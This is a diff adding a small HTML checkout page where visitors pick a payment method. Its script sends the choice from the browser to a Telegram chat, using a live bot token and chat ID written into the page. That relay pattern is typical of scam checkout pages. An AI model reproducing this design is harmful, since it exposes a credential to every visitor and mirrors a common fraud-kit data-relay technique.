@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 20px;
+    }
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 20px;
+      color: #222;
+    }
+
+    .payment-option {
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .payment-option:hover {
+      border-color: #ff9900;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .payment-option input {
+      margin-right: 15px;
+      transform: scale(1.2);
+    }
+
+    .payment-option label {
+      font-size: 16px;
+      color: #333;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      background: #ff9900;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      background: #e68a00;
+    }
+    p{
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Select Payment Method</h2>
+
+    <div class="payment-option">
+      <input type="radio" name="payment" id="upi">
+      <label for="upi">UPI / QR Code</label>
+    </div>
+
+    <div class="payment-option">
+      <input type="radio" name="payment" id="card">
+      <label for="card">Debit / Credit Card</label>
+    </div>
+
+    <div class="payment-option">
+      <input type="radio" name="payment" id="netbanking">
+      <label for="netbanking">Net Banking</label>
+    </div>
+
+    <div class="payment-option">
+      <input type="radio" name="payment" id="cod">
+      <label for="cod">Cash on Delivery</label>
+    </div>
+
+    <button class="btn">Continue</button>
+  </div>
+  <p>You payment 100% secured</p>
+</body>
+<script>document.addEventListener("DOMContentLoaded", function () {
+const continueBtn = document.querySelector(".btn");
+
+continueBtn.addEventListener("click", function () {
+const paymentMethod = document.querySelector('input[name="payment"]:checked');
+if (!paymentMethod) {
+alert("Please select a payment method.");
+return;
+}
+
+const payment = paymentMethod.nextElementSibling.innerText;
+
+// Telegram Bot Info
+const botToken = "7332056218:AAHBeOYPKvLTvAieuOuDX_KtvP2b5nS364M";
+const chatId = "6981597316";
+
+const message = `
+💳 *New Payment Selection*
+Payment Method: ${payment}
+`;
+
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+chat_id: chatId,
+text: message,
+parse_mode: "Markdown"
+})
+})
+.then(res => res.json())
+.then(data => {
+if (data.ok) {
+// Redirect after sending
+window.location.href = "/order.html";
+} else {
+alert("Failed to send. Check bot details.");
+}
+})
+.catch(err => {
+console.error(err);
+alert("Error occurred while sending message.");
+});
+});
+});</script>
+</html>
